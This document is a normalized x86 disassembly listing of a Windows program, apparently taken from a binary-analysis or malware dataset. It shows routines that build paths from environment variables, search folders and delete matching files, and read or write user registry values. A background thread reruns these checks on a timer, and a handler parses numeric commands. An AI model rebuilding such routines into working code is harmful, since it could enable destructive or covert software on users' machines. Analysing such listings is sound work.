mov esi [ ebp - 0xc ]
pop edi
cmp esi [ eax + 0x18 ]
pop esi
pop ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
add [ ebp - 0x8 ] 0x2
inc esi
inc esi
test dl dl
jne r-xdata
mov edx [ ebp + 0x8 ]
jmp r-xdata
mov dl [ esi ]
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x1 ] dl
cmp dl [ ebx ]
jne r-xdata
sub_405622
push ebp
mov ebp esp
sub esp 0x24
push ebx
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
mov bl 0x1
call [ GetLastError@IAT ]
dec eax
dec eax
je r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec eax
je r-xdata
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
xor bl bl
jmp r-xdata
pop ebx
leave
retn
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
sub_4056ec
push ebp
mov ebp esp
sub esp 0x24
push ebx
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
mov bl 0x1
call [ GetLastError@IAT ]
dec eax
dec eax
je r-xdata
push 0x0
lea eax [ ebp - 0x2 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
dec eax
je r-xdata
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
xor bl bl
jmp r-xdata
pop ebx
leave
retn
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
sub_4057b6
push ebp
mov ebp esp
sub esp 0x1b8
push ebx
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x48 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1b8 ]
push eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x1b8 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
xor ebx ebx
test eax eax
je r-xdata
push 0xffffffff
call [ FindClose@IAT ]
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
mov bl 0x1
jmp r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
push 0x2
pop edi
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
jmp r-xdata
lea eax [ ebp - 0x1b8 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x18c ]
pop edi
pop esi
pop ebx
leave
retn
test [ ebp - 0x1b8 ] 0x10
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov esi r--data
lea eax [ ebp - 0x18c ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax edi
add esi edi
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x18c ]
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x38 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x18c ]
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x68 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x48 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x68 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ rw-data ] bl
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp [ rw-data ] bl
jne r-xdata
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
cmp eax ebx
je r-xdata
add eax edi
add esi edi
cmp cl bl
jne r-xdata
cmp [ rw-data ] bl
je r-xdata
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
call [ GetLastError@IAT ]
sub eax edi
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov [ rw-data ] 0x1
call [ GetLastError@IAT ]
sub eax edi
jne r-xdata
mov [ rw-data ] bl
jmp r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
mov bl 0x1
mov [ rw-data ] bl
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
sub_405afb
push ebp
mov ebp esp
sub esp 0x188
push ebx
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push r--data
call [ getenv@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp - 0x18 ]
push r--data
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x188 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
xor ebx ebx
push 0xffffffff
call [ FindClose@IAT ]
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al 0x1
test [ ebp - 0x188 ] 0x10
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
mov bl 0x1
lea eax [ ebp - 0x188 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileA@IAT ]
jmp r-xdata
mov esi r--data
lea eax [ ebp - 0x15c ]
pop esi
pop ebx
leave
retn
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov esi r--data
lea eax [ ebp - 0x15c ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
inc eax
inc eax
inc esi
inc esi
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x15c ]
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x38 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push ebx
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ GetLastError@IAT ]
dec eax
dec eax
jne r-xdata
cmp eax ebx
je r-xdata
inc eax
inc eax
inc esi
inc esi
cmp cl bl
jne r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
jmp r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
jmp r-xdata
sub_405d53
push ebp
mov ebp esp
sub esp 0x128
lea eax [ ebp - 0x1 ]
push ebx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push r--data
lea eax [ ebp - 0x24 ]
push 0x80000001
push eax
xor bl bl
call sub_408ef1
add esp 0x10
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x128 ]
push 0x104
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
lea eax [ ebp - 0x128 ]
push eax
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
lea eax [ ebp - 0x128 ]
push eax
call sub_40f234
pop ecx
test eax eax
push 0x0
je r-xdata
push eax
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
mov bl 0x1
jmp r-xdata
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
test eax eax
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
push eax
push r--data
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop ebx
leave
retn
push 0x0
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov bl 0x1
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
sub_405e72
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push [ rw-data ]
mov esi [ Sleep@IAT ]
mov [ rw-data ] 0x1
call esi
xor ebx ebx
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x5 ] bl
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x2 ] bl
jne r-xdata
call sub_405d53
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x5 ] bl
jne r-xdata
call sub_405afb
mov [ ebp - 0x2 ] al
cmp [ ebp - 0x3 ] bl
jne r-xdata
call sub_4057b6
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x4 ] bl
jne r-xdata
call sub_4056ec
mov [ ebp - 0x3 ] al
cmp [ ebp - 0x1 ] bl
je r-xdata
call sub_405622
mov [ ebp - 0x4 ] al
push 0x1388
call esi
cmp [ ebp - 0x2 ] bl
je r-xdata
cmp [ ebp - 0x2 ] bl
je r-xdata
cmp [ ebp - 0x3 ] bl
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ ebp - 0x3 ] bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp - 0x5 ] bl
jne r-xdata
cmp [ ebp - 0x5 ] bl
je r-xdata
cmp [ ebp - 0x1 ] bl
je r-xdata
push ebx
lea eax [ ebp - 0x5 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx rw-data
call sub_403a9a
cmp [ rw-data ] bl
je r-xdata
mov [ rw-data ] bl
pop esi
xor eax eax
pop ebx
leave
retn
push 0x1
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_409046
add esp 0x10
sub_405f6c
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov al [ ebp + 0x8 ]
imul ecx ecx 0xea60
push ebx
push esi
test al al
push edi
mov [ rw-data ] al
mov [ rw-data ] ecx
je r-xdata
xor eax eax
and [ ebp + 0x8 ] 0x0
mov ebx r--data
mov edi rw-data
push ebx
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi 0x80000001
push eax
push esi
call sub_408e4e
add esp 0xc
test al al
je r-xdata
lea eax [ ebp + 0x8 ]
mov ecx edi
push eax
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_408e97
xor eax eax
add esp 0x10
cmp [ ebp + 0x8 ] eax
je r-xdata
push eax
push eax
push eax
push sub_405e72
push eax
push eax
call [ CreateThread@IAT ]
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_406055
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_402109
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402168
cmp [ rw-data ] 0x0
push rw-data
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40edd3
push ecx
push ecx
mov esi esp
push eax
push rw-data
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
call sub_402198
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40edd3
push ecx
push ecx
mov esi esp
push eax
push rw-data
lea eax [ ebp - 0x10 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
call sub_402198
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
push sub_40612a
mov ecx ebx
call sub_40221c
pop edi
pop esi
pop ebx
leave
retn
sub_40612a
push ebp
mov ebp esp
sub esp 0x40
push esi
push edi
sub esp 0x10
mov esi rw-data
mov ecx esp
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40efb5
add esp 0x24
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_401289
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi [ std::operator==@IAT ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call edi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call edi
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4052ec
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call sub_401b3c
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
xor eax eax
pop esi
leave
retn
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call [ rw-data ]
pop ecx
pop ecx
push r--data
push eax
call sub_405546
mov [ rw-data ] eax
lea eax [ ebp - 0x40 ]
push rw-data
push eax
mov [ rw-data ] 0x1
call sub_40edd3
mov edi esp
push eax
push esi
lea eax [ ebp - 0x30 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push edi
